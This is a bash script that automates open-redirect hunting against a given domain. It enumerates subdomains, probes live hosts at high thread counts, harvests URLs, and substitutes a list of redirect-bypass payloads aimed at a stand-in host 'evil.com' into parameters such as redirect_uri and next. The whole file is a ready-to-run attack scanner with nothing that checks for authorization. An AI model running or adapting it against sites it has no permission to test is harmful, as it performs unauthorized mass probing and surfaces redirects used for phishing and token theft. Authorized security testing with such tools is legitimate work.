#!/bin/bash

usage() {
    echo "Usage: $0 -u <domain>"
    exit 1
}

if [ $# -eq 0 ]; then
    usage
fi

while getopts ":u:" opt; do
    case ${opt} in
        u )
            domain=$OPTARG
            ;;
        \? )
            echo "Invalid option: $OPTARG" 1>&2
            usage
            ;;
        : )
            echo "Invalid option: $OPTARG requires an argument" 1>&2
            usage
            ;;
    esac
done
shift $((OPTIND -1))

if [ -z "$domain" ]; then
    echo "Domain is required"
    usage
fi

echo "[+] Step 1: Subdomain searching for $domain..."
subdomains_assetfinder=$(assetfinder -subs-only "$domain" | uniq | sort)
subdomains_subfinder=$(subfinder -d "$domain" -silent)
subdomains=$(echo -e "$subdomains_assetfinder\n$subdomains_subfinder" | sort -u)

echo "[+] Step 2: Checking for live subdomains using httpx-toolkit..."
alivesubs=$(echo "$subdomains" | httpx-toolkit -ports 80,443,8000,8080,8888 -threads 200)

echo "[+] Step 3: Crawling Parameters and filtering them..."
links=$(echo "$alivesubs" | gau --threads 100)

echo "[+] Filtering for potential open redirect parameters."
filtered_links=$(echo "$links" | grep -E "(redirect_uri|next|url|return_to|target|destination|continue|prev)=(https?://)")

echo "[+] Testing for open redirects..."
for link in $filtered_links; do
    # Bypass techniques for each found URL
    modified_links=(
        "$link"  # Keep the original link

        "$(echo "$link" | sed -E 's/(redirect_uri|next|url|return_to|target|destination|continue|prev)=[^&]+/\1=https:\/\/evil.com/')"
        "$(echo "$link" | sed -E 's/(redirect_uri|next|url|return_to|target|destination|continue|prev)=[^&]+/\1=\/\/evil.com/')"
        "$(echo "$link" | sed -E 's/(redirect_uri|next|url|return_to|target|destination|continue|prev)=[^&]+/\1=\\evil.com/')"
        "$(echo "$link" | sed -E 's/(redirect_uri|next|url|return_to|target|destination|continue|prev)=[^&]+/\1=https:evil.com/')"
        "$(echo "$link" | sed -E 's/(redirect_uri|next|url|return_to|target|destination|continue|prev)=[^&]+/\1=example.com%40evil.com/')"
        "$(echo "$link" | sed -E 's/(redirect_uri|next|url|return_to|target|destination|continue|prev)=[^&]+/\1=example.comevil.com/')"
        "$(echo "$link" | sed -E 's/(redirect_uri|next|url|return_to|target|destination|continue|prev)=[^&]+/\1=example.com%2eevil.com/')"
        "$(echo "$link" | sed -E 's/(redirect_uri|next|url|return_to|target|destination|continue|prev)=[^&]+/\1=evil.com?example.com/')"
        "$(echo "$link" | sed -E 's/(redirect_uri|next|url|return_to|target|destination|continue|prev)=[^&]+/\1=evil.com%23example.com/')"
        "$(echo "$link" | sed -E 's/(redirect_uri|next|url|return_to|target|destination|continue|prev)=[^&]+/\1=example.com\/°evil.com/')"
        "$(echo "$link" | sed -E 's/(redirect_uri|next|url|return_to|target|destination|continue|prev)=[^&]+/\1=evil.com%E3%80%82%23example.com/')"
        "$(echo "$link" | sed -E 's/(redirect_uri|next|url|return_to|target|destination|continue|prev)=[^&]+/\1=\/%0d\/evil.com/')"
    )

    # Now test each modified URL
    for modified_link in "${modified_links[@]}"; do
        response=$(echo "$modified_link" | xargs -I@ curl -I -s @ | grep "evil.com")
        if [ -n "$response" ]; then
            echo "[+] Open Redirect Detected: $modified_link"
        fi
    done
done
